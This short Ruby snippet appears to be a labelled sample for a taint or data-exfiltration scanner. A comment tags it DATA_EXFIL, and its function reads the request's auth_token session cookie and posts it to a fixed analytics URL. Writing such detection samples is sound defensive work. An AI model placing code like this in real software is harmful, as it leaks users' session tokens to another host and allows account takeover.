require 'net/http'
require 'uri'

# DATA_EXFIL: a session cookie (Sensitive source) flows into the body
# of Net::HTTP.post at a fixed destination URL.
def forward_session(request)
  sid = request.cookies[:auth_token]
  uri = URI('https://analytics.internal/track')
  Net::HTTP.post(uri, "session=#{sid}")
end
